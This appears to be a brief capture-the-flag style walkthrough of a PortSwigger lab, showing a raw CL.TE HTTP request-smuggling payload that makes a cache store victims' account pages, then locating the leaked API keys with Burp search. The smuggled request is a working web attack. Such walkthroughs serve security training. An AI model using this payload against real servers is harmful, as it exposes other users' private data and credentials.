Exploiting HTTP request smuggling to perform web cache deception

Our last smuggling lab. And easier to to trigger than the rest. The solution provided is pretty good.

Request used to smuggle:

POST / HTTP/1.1
Host: ac091f0a1f8f19dc800ae937003100e6.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-deception
Connection: close
Cookie: session=Yf9rTdNjvJoz8q4VcJCw14LvJBydeGNa
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
X-Ignore: X 


Send it a bunch of times until you start getting unauthorized responses. Open a page in incognito and access the lab URL. 
Now use the Bup search function (top left corner Burp tab -> Search) and search for "Your API Key". In my case, this is the request that had a response with cached API keys:

GET /resources/js/tracking.js HTTP/1.1
Host: ac091f0a1f8f19dc800ae937003100e6.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: https://ac091f0a1f8f19dc800ae937003100e6.web-security-academy.net/
Cookie: session=IVa9pg0PvkAZUeKU89GCKj7wwu5Of4xQ
Cache-Control: max-age=0

Congrats, you're done!